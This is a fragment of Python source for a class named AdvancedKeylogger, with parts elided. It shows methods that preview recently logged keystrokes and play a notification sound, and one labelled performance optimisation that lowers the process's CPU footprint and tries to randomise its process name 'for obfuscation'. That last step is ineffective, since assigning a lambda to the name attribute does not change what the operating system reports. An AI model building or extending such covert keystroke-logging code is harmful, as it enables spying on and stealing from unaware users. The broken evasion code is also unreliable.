...
class AdvancedKeylogger:
    ...
    def update_preview(self, log_entry):
        ...
        for entry in self.keys[-15:]:  # Show last 15 entries
    ...
    def play_sound(self):
        try:
            # Use a Windows-compatible sound file or bundle one with the application
            sound_file = "notification.wav"  # Ensure this file exists in the working directory
            pygame.mixer.music.load(sound_file)
            pygame.mixer.music.play()
        except Exception as e:
            print(f"Sound playback failed: {str(e)}")  # Log error for debugging

    def optimize_performance(self):
        try:
            process = psutil.Process()
            # Set CPU affinity to the first core (cross-platform)
            process.cpu_affinity([0])
            # Set process priority to below normal (Windows-compatible)
            process.nice(psutil.BELOW_NORMAL_PRIORITY_CLASS if platform.system() == "Windows" else 10)
            # Randomize process name for obfuscation
            random_name = "".join(random.choices(string.ascii_letters, k=10))
            psutil.Process().name = lambda: random_name
        except Exception as e:
            print(f"Performance optimization failed: {str(e)}")  # Log error for debugging
